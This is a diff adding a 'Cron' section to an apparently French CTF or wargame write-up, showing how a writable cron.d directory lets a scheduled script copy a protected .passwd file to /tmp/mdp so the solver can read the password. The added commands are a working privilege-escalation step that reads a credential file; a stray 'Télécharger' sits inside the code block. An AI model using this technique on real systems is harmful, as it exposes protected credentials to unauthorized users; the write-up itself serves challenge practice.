@@ -77,3 +77,18 @@ so i run
 et voila
 
 thank you .
+
+### Cron
+
+Each minute, everything in cron.d is executed so we simply add a task :
+````
+echo '#!/bin/sh
+> cat .passwd > /tmp/mdp' > cron.d/task1; chmod 4777 cron.d/task1
+Télécharger
+````
+(the \n is important)
+
+wait one minute and
+````
+cat /tmp/mdp gives us the password : xx
+````
